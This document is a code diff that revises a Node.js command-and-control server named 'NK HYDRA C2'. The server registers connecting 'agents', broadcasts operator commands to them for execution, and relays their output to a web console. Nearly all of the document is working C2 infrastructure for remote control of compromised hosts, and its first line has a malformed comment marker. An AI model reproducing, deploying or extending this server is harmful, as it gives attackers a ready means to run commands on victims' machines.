@@ -1,6 +1,5 @@
-// NK HYDRA C2 SERVER v28.8 (REALTIME CORE)
-// USAGE: node server.js
-// DEPENDENCIES: npm install express socket.io cors
+/ NK HYDRA C2 SERVER v28.9
+// COMMAND: node c2_server.js
 
 const express = require('express');
 const http = require('http');
@@ -8,88 +7,45 @@ const { Server } = require('socket.io');
 const cors = require('cors');
 
 const app = express();
-app.use(cors()); // Allow all origins (Localhost/Production)
+app.use(cors());
+
+// --- ROOT STATUS CHECK (Fixes "Cannot GET /") ---
+app.get('/', (req, res) => {
+    res.send("<html><body style='background:black;color:#00ff41;font-family:monospace;'><h1>NK HYDRA C2 HIVE: ONLINE</h1><p>Status: WAITING_FOR_AGENTS</p></body></html>");
+});
 
 const server = http.createServer(app);
 const io = new Server(server, { 
-    cors: { origin: "*", methods: ["GET", "POST"] },
-    maxHttpBufferSize: 1e8,
+    cors: { origin: "*" },
     pingTimeout: 60000
 }); 
 
-let agents = new Map();
-
-// --- EVENTS ---
+// LOGGING
+console.log("[*] INITIALIZING C2 SERVER...");
 
 io.on('connection', (socket) => {
     
-    // 1. IDENTIFICATION (Agent or Frontend?)
     socket.on('identify', (data) => {
         if (data.type === 'agent') {
-            const agentId = data.id;
-            const agentIp = socket.handshake.address.replace('::ffff:', '');
-            
-            console.log(`[+] AGENT CONNECTED: ${agentId} (${agentIp})`);
-            
-            agents.set(socket.id, { 
-                id: agentId, 
-                ip: agentIp, 
-                os: data.os, 
-                socketId: socket.id,
-                status: 'ONLINE' 
-            });
-            
-            // Notify Frontend
-            io.emit('log', `[SYSTEM] NODE CONNECTED: ${agentId}`);
-            broadcastStatus();
+            console.log(`[+] AGENT CONNECTED: ${data.id}`);
+            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${data.id}`);
+            io.emit('status', { agents: [{ id: data.id, status: 'ONLINE', ip: 'REMOTE' }] });
         }
     });
 
-    // 2. COMMAND RELAY (Frontend -> Agent)
     socket.on('cmd', (data) => {
-        // Log locally on server console
-        console.log(`[CMD REQUEST] From WebUI: ${data.cmd} -> Target: ${data.target}`);
-        
-        // Broadcast to ALL connected sockets (Agents will filter)
-        // We call the event 'exec' as expected by agent.py
-        io.emit('exec', { 
-            cmd: data.cmd, 
-            target: data.target || 'ALL' 
-        });
-        
-        // Confirm to Frontend
-        io.emit('log', `[C2] RELAYING COMMAND: ${data.cmd}`);
+        console.log(`[CMD RELAY] ${data.cmd}`);
+        io.emit('exec', data); // Broadcast to agents
+        io.emit('log', `[C2] EXECUTING: ${data.cmd}`);
     });
 
-    // 3. LOG STREAM (Agent -> Frontend)
     socket.on('stream_log', (data) => {
         console.log(`[${data.from}] ${data.output}`);
-        // Forward directly to Frontend
-        io.emit('log', data); 
-    });
-
-    socket.on('disconnect', () => {
-        if (agents.has(socket.id)) {
-            const a = agents.get(socket.id);
-            console.log(`[-] AGENT LOST: ${a.id}`);
-            agents.delete(socket.id);
-            broadcastStatus();
-        }
+        io.emit('log', data);
     });
 });
-
-function broadcastStatus() {
-    const list = Array.from(agents.values()).map(a => ({
-        id: a.id, ip: a.ip, os: a.os, status: a.status, lastSeen: Date.now()
-    }));
-    io.emit('status', { agents: list });
-}
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`------------------------------------------`);
-    console.log(`[*] NK HYDRA C2 SERVER LISTENING ON ${PORT}`);
-    console.log(`[*] WAITING FOR AGENTS AND FRONTEND...`);
-    console.log(`------------------------------------------`);
+    console.log(`[+] SERVER LISTENING ON PORT ${PORT}`);
 });
-    
